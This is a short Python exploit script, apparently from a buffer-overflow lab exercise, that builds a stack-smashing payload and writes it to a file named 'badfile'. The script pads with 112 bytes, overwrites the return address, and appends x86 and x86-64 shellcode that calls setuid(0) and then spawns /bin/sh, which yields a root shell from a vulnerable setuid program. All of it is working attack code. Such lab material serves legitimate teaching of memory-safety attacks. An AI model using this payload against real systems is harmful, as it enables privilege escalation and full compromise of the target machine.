
retaddr = 0xffffcb98 + 0x6c       # Due to extending actual frame pointer when using GDB Debugger
shell_code_32 = b'\x31\xdb\x31\xc0\xb0\xd5\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\x31\xc0\xb0\x0b\xcd\x80'                     # setuid(0) + shellcode - 32 bits
shell_code_64 = b'\x48\x31\xff\x48\x31\xc0\xb0\x69\x0f\x05\x48\x31\xd2\x52\x48\xb8\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x48\x31\xc0\xb0\x3b\x0f\x05' # setuid(0) + shellcode - 64 bits

payload = b'A' * 112              # Change this value base on each task
payload += retaddr.to_bytes(4, 'little')    # 4 or 8 bytes return address
payload += b'B' * 4               # 4 or 8 bytes
payload += shell_code_32          # Shellcode depends on architecture of vulnerable program in each task

print("Length of shellcode: {}".format(len(shell_code_32)))

# Write the content to a file
with open('badfile', 'wb') as f:
  f.write(payload)